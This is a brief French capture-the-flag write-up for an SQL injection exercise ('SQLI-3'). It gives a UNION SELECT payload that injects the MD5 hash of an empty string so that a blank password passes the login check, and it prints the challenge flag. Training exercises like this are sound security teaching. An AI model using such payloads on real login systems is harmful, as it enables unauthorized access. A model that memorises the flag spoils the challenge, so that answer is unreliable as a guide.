# SQLI-3

## Description

Apprendre les injections SQL (3/3).

## Solution

' UNION SELECT '', 'D41D8CD98F00B204E9800998ECF8427E

D41D8CD98F00B204E9800998ECF8427E est égal à strtoupper(bin2hex(md5(""))) en php. On peut donc laisser le mot de passe vide et on respecte la condition de login.

## Flag

FLAG-0783985441fffd91df30f3d4bda79a84

